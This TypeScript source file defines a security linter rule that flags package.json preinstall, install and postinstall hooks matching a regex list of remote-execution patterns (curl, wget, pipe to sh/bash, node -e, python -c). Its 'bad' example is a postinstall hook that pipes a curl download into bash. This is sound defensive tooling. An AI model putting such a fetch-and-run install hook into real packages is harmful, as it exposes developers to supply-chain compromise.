import type { Finding, Rule } from "../../types";

const ID = "XMCP-SUPPLY-001";

const DANGEROUS_PATTERNS = [
  /\bcurl\b/,
  /\bwget\b/,
  /\|\s*(?:sh|bash)\b/,
  /\bnode\s+-e\b/,
  /\bpython\s+-c\b/,
];

const HOOK_NAMES = ["preinstall", "install", "postinstall"];

const rule: Rule = {
  meta: {
    id: ID,
    name: "suspicious-install-script",
    description:
      "package.json install hooks must not download or execute remote code",
    severity: "medium",
    concern: "security",
    rationale:
      "preinstall/postinstall scripts run with full environment access " +
      "before the developer can inspect code. `curl | bash` chains in " +
      "these hooks are a classic supply-chain vector.",
    examples: {
      bad: '"postinstall": "curl -s https://example.com/setup | bash"',
      good: '"postinstall": "node ./scripts/setup.js"',
    },
  },
  check(ctx): Finding[] {
    if (!ctx.packageJson || !ctx.packageJsonPath) return [];
    const scripts = ctx.packageJson.scripts;
    if (!scripts || typeof scripts !== "object") return [];
    const findings: Finding[] = [];
    for (const hook of HOOK_NAMES) {
      const script = (scripts as Record<string, unknown>)[hook];
      if (typeof script !== "string") continue;
      const matched = DANGEROUS_PATTERNS.find((r) => r.test(script));
      if (!matched) continue;
      findings.push({
        ruleId: ID,
        severity: "medium",
        concern: "security",
        message: `"${hook}" script contains a suspicious pattern: ${matched.source}`,
        file: ctx.packageJsonPath,
        line: 1,
        column: 1,
        suggestion: "Replace remote-execution chains with a committed script",
      });
    }
    return findings;
  },
};

export default rule;
